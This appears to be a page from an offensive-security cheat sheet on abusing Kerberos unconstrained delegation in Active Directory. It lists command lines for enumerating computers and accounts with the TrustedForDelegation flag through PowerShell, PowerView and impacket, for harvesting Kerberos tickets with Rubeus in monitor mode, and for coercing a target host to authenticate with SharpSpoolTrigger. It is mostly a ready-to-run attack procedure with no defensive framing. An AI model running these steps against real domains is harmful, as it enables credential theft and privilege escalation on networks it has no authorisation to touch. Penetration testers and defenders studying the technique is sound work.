# Unconstrained Delegation Abuse

## Unconstrained Delegation Abuse [t-ad-delegation-unconstrained_delegation_abuse]

### 1.1 Find computers with enabled “TrustedForDelegation” flag




**option 1: Powershell**

{% code overflow="wrap" %}
```bash
Get-ADObject -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
{% endcode %}


**option 2: Powerview**

{% code overflow="wrap" %}
```bash
#For hosts:
Get-DomainComputer -Unconstrained

#For accounts:
Get-DomainUser -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

```
{% endcode %}


**option 3: impacket**

{% code overflow="wrap" %}
```bash
impacket-findDelegation domain.com/user

```
{% endcode %}

### 1.2 Run a tool to export tickets



{% code overflow="wrap" %}
```bash
Rubeus.exe monitor /interval:10 /nowrap
```
{% endcode %}

### 1.3 Coerce the target host to authenticate (optional)



{% code overflow="wrap" %}
```bash
SharpSpoolTrigger.exe target.domain.com web.domain.com
```
{% endcode %}

{% hint style="info" %}Any other tools can be used

{% endhint %}

